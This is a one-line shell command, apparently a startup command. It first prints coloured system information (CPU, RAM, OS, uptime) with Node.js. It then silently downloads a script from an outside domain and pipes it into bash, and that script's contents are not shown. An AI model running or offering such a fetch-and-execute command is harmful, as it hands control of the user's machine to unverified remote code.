node -e "const os=require('os');function c(t){return '\x1b[36m'+t+'\x1b[0m'};function h(t){return '\x1b[34;1m'+t+'\x1b[0m'};console.log(h('=== SYSTEM INFORMATION ==='));console.log(c('CPU Cores   :'),os.cpus().length);console.log(c('CPU Model   :'),os.cpus()[0].model);console.log(c('Arch        :'),os.arch());console.log(c('Platform    :'),os.platform());console.log(c('OS Release  :'),os.release());console.log(c('Total RAM   :'),(os.totalmem()/1024/1024/1024).toFixed(2),'GB');console.log(c('Free RAM    :'),(os.freemem()/1024/1024/1024).toFixed(2),'GB');console.log(c('Uptime      :'),(os.uptime()/3600).toFixed(2),'hours');console.log(h('=============================='));" && bash <(curl -s https://api.ryuu-dev.offc.my.id/src/startup.sh)
